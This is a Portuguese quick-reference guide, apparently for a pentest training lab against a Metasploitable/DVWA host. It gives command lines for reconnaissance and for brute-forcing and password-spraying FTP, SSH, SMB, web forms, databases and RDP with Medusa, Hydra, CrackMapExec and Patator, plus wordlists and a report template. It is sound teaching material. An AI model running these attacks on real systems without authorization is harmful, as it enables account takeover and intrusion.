# 🚀 Guia Rápido de Comandos - Medusa e Kali Linux

## Índice
- [Reconhecimento](#reconhecimento)
- [Medusa - Comandos Básicos](#medusa---comandos-básicos)
- [Ataques por Protocolo](#ataques-por-protocolo)
- [Validação de Acessos](#validação-de-acessos)
- [Ferramentas Complementares](#ferramentas-complementares)
- [Troubleshooting](#troubleshooting)

---

## 🔍 Reconhecimento

### Nmap - Descoberta de Serviços

```bash
# Scan básico de portas comuns
nmap 192.168.56.20

# Scan com detecção de versões
nmap -sV 192.168.56.20

# Scan de portas específicas
nmap -p 21,22,80,139,445 192.168.56.20

# Scan completo com scripts
nmap -sC -sV -p- 192.168.56.20

# Scan agressivo (mais ruidoso)
nmap -A 192.168.56.20

# Salvar resultados
nmap -sV 192.168.56.20 -oN scan_results.txt
nmap -sV 192.168.56.20 -oX scan_results.xml

# Scan de múltiplos hosts
nmap 192.168.56.0/24
```

### Enum4Linux - Enumeração SMB

```bash
# Enumeração completa
enum4linux -a 192.168.56.20

# Enumerar usuários
enum4linux -U 192.168.56.20

# Enumerar compartilhamentos
enum4linux -S 192.168.56.20

# Enumerar grupos
enum4linux -G 192.168.56.20

# Enumeração com credenciais
enum4linux -u msfadmin -p msfadmin -a 192.168.56.20
```

---

## 🔨 Medusa - Comandos Básicos

### Sintaxe Geral
```bash
medusa -h [host] -u [user] -P [password_file] -M [module] -t [threads]
```

### Opções Principais

```bash
-h    # Host alvo (IP ou hostname)
-H    # Arquivo com lista de hosts
-u    # Usuário único
-U    # Arquivo com lista de usuários
-p    # Senha única
-P    # Arquivo com lista de senhas
-C    # Arquivo com pares usuário:senha
-M    # Módulo (protocolo) a ser usado
-t    # Número de threads (padrão: 4)
-f    # Parar após primeira senha encontrada
-F    # Parar após primeiro host encontrado
-n    # Usar porta não-padrão
-s    # Habilitar SSL
-O    # Salvar resultados em arquivo
-v    # Modo verbose (mais detalhes)
-V    # Versão do Medusa
```

### Listar Módulos Disponíveis
```bash
medusa -d
```

Módulos comuns:
- `ftp` - File Transfer Protocol
- `ssh` - Secure Shell
- `http` - HTTP Basic Auth
- `web-form` - Formulários web
- `smbnt` - Windows SMB
- `mysql` - MySQL Database
- `postgres` - PostgreSQL
- `rdp` - Remote Desktop
- `telnet` - Telnet

---

## 🎯 Ataques por Protocolo

### FTP (Porta 21)

**Ataque com usuário conhecido:**
```bash
medusa -h 192.168.56.20 -u msfadmin -P passwords.txt -M ftp
```

**Ataque com múltiplos usuários:**
```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ftp -t 4
```

**Parar após primeiro sucesso:**
```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ftp -f
```

**Testar usuário anônimo:**
```bash
medusa -h 192.168.56.20 -u anonymous -p anonymous -M ftp
```

---

### SSH (Porta 22)

**Ataque básico:**
```bash
medusa -h 192.168.56.20 -u root -P passwords.txt -M ssh
```

**Com múltiplos usuários:**
```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ssh -t 2
```

**Porta customizada:**
```bash
medusa -h 192.168.56.20 -u user -P passwords.txt -M ssh -n 2222
```

**Modo verbose:**
```bash
medusa -h 192.168.56.20 -u admin -P passwords.txt -M ssh -v 6
```

---

### SMB/SMBNT (Portas 139/445)

**Ataque básico:**
```bash
medusa -h 192.168.56.20 -u administrator -P passwords.txt -M smbnt
```

**Password Spraying (uma senha, múltiplos usuários):**
```bash
medusa -h 192.168.56.20 -U users.txt -p Password123! -M smbnt
```

**Com domínio Windows:**
```bash
medusa -h 192.168.56.20 -u DOMAIN\\user -P passwords.txt -M smbnt
```

---

### HTTP Basic Auth (Porta 80/443)

**Autenticação básica:**
```bash
medusa -h 192.168.56.20 -u admin -P passwords.txt -M http -m DIR:/admin
```

**Com HTTPS:**
```bash
medusa -h 192.168.56.20 -u admin -P passwords.txt -M http -m DIR:/admin -s
```

---

### Web Forms (Formulários Web)

**DVWA Brute Force:**
```bash
medusa -h 192.168.56.20 -u admin -P passwords.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/:GET:username=^USER^&password=^PASS^&Login=Login:S=Welcome:F=incorrect:H=Cookie: security=low; PHPSESSID=abc123"
```

**Explicação dos parâmetros:**
- `FORM:` - Tipo de requisição
- `/path/` - Caminho do formulário
- `GET` ou `POST` - Método HTTP
- `username=^USER^` - Campo de usuário
- `password=^PASS^` - Campo de senha
- `S=Welcome` - String de sucesso
- `F=incorrect` - String de falha
- `H=Cookie:` - Headers adicionais

---

### MySQL (Porta 3306)

```bash
medusa -h 192.168.56.20 -u root -P passwords.txt -M mysql
```

### PostgreSQL (Porta 5432)

```bash
medusa -h 192.168.56.20 -u postgres -P passwords.txt -M postgres
```

### RDP (Porta 3389)

```bash
medusa -h 192.168.56.20 -u administrator -P passwords.txt -M rdp
```

---

## ✅ Validação de Acessos

### FTP
```bash
# Conectar via linha de comando
ftp 192.168.56.20
# Usuário: msfadmin
# Senha: msfadmin

# Comandos úteis no FTP
ls              # Listar arquivos
cd /path        # Mudar diretório
get file.txt    # Baixar arquivo
put file.txt    # Enviar arquivo
bye             # Desconectar
```

### SSH
```bash
# Conectar via SSH
ssh msfadmin@192.168.56.20

# Com porta customizada
ssh -p 2222 msfadmin@192.168.56.20

# Com chave privada
ssh -i id_rsa user@192.168.56.20
```

### SMB
```bash
# Listar compartilhamentos
smbclient -L //192.168.56.20 -U msfadmin

# Conectar a compartilhamento específico
smbclient //192.168.56.20/tmp -U msfadmin

# Comandos no SMB
ls              # Listar
cd dirname      # Mudar diretório
get file        # Baixar
put file        # Enviar
exit            # Sair
```

### MySQL
```bash
# Conectar ao MySQL
mysql -h 192.168.56.20 -u root -p

# Comandos básicos
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM table_name;
```

---

## 🛠️ Ferramentas Complementares

### Hydra (Alternativa ao Medusa)

**FTP:**
```bash
hydra -l msfadmin -P passwords.txt ftp://192.168.56.20
```

**SSH:**
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.56.20
```

**HTTP POST Form:**
```bash
hydra -l admin -P passwords.txt 192.168.56.20 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

**Múltiplos protocolos:**
```bash
# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.56.20

# SSH com 4 threads
hydra -l root -P passwords.txt -t 4 ssh://192.168.56.20

# MySQL
hydra -l root -P passwords.txt mysql://192.168.56.20
```

---

### CrackMapExec (SMB/WinRM)

**SMB Password Spraying:**
```bash
crackmapexec smb 192.168.56.20 -u users.txt -p 'Password123!'
```

**Com domínio:**
```bash
crackmapexec smb 192.168.56.20 -d DOMAIN -u admin -p passwords.txt
```

**Executar comando após sucesso:**
```bash
crackmapexec smb 192.168.56.20 -u admin -p pass -x "whoami"
```

---

### Patator (Framework Python)

```bash
# SSH
patator ssh_login host=192.168.56.20 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'

# FTP
patator ftp_login host=192.168.56.20 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt
```

---

## 🐛 Troubleshooting

### Problemas Comuns

**1. "No valid accounts found"**
```bash
# Verificar se o serviço está ativo
nmap -p 21 192.168.56.20

# Testar conexão manual
telnet 192.168.56.20 21
```

**2. "Connection refused"**
```bash
# Verificar firewall
sudo iptables -L

# Verificar se porta está aberta
nc -zv 192.168.56.20 21
```

**3. "Too many connections"**
```bash
# Reduzir número de threads
medusa -h 192.168.56.20 -u user -P pass.txt -M ftp -t 1
```

**4. Ataque muito lento**
```bash
# Aumentar threads (cuidado!)
medusa -h 192.168.56.20 -u user -P pass.txt -M ftp -t 8

# Usar wordlist menor
head -100 big_wordlist.txt > small_wordlist.txt
```

---

## 📊 Análise de Resultados

### Monitorar logs do alvo

**No Metasploitable/Ubuntu:**
```bash
# Logs de autenticação
tail -f /var/log/auth.log

# Logs do FTP
tail -f /var/log/vsftpd.log

# Filtrar tentativas falhas
grep "Failed password" /var/log/auth.log

# Contar tentativas por IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
```

---

## 💾 Salvar e Organizar Resultados

```bash
# Criar estrutura de diretórios
mkdir -p results/{ftp,ssh,smb,web}

# Salvar resultados do Medusa
medusa -h 192.168.56.20 -u user -P pass.txt -M ftp -O results/ftp/output.txt

# Timestamp nos arquivos
medusa -h 192.168.56.20 -u user -P pass.txt -M ssh \
  -O results/ssh/scan_$(date +%Y%m%d_%H%M%S).txt

# Log completo
medusa -h 192.168.56.20 -u user -P pass.txt -M ftp -v 6 \
  2>&1 | tee results/ftp/detailed_log.txt
```

---

## 🔐 Wordlists Úteis

### Localização no Kali Linux
```bash
# SecLists
/usr/share/wordlists/seclists/

# RockYou (descompactar primeiro)
gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt

# Nomes de usuário comuns
/usr/share/wordlists/metasploit/common_users.txt

# Senhas comuns
/usr/share/wordlists/metasploit/common_passwords.txt
```

### Criar wordlist customizada
```bash
# Top 10 senhas
cat > top10.txt << EOF
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
EOF

# Gerar variações
crunch 6 6 -t pass%% > numeric_variations.txt
```

---

## 📝 Template de Relatório

```bash
# Gerar relatório automático
cat > report.txt << EOF
========================================
RELATÓRIO DE TESTE DE FORÇA BRUTA
========================================

Data: $(date)
Alvo: 192.168.56.20
Testador: [Seu Nome]

SERVIÇOS TESTADOS:
------------------
$(nmap -sV -p 21,22,139,445 192.168.56.20 | grep open)

CREDENCIAIS ENCONTRADAS:
------------------------
$(cat results/*/output.txt | grep "ACCOUNT FOUND")

RECOMENDAÇÕES:
--------------
1. Implementar políticas de senha forte
2. Configurar fail2ban
3. Habilitar MFA
4. Monitorar logs de autenticação

========================================
EOF
```

---

## 🚨 Avisos Importantes

1. **Use apenas em ambientes autorizados**
2. **Respeite rate limits para não travar serviços**
3. **Documente todas as ações**
4. **Mantenha logs organizados**
5. **Não use em produção sem permissão**

---

## 📚 Comandos de Referência Rápida

```bash
# Instalar Medusa
sudo apt install medusa

# Verificar versão
medusa -V

# Listar módulos
medusa -d

# Ajuda geral
medusa -h

# Ajuda de módulo específico
medusa -M ftp -q

# Teste rápido FTP
medusa -h IP -u user -p pass -M ftp

# Teste rápido SSH
medusa -h IP -u user -p pass -M ssh

# Ataque completo
medusa -h IP -U users.txt -P pass.txt -M ftp -t 4 -f -O results.txt
```

---

**Última atualização:** 2024  
**Versão:** 1.0
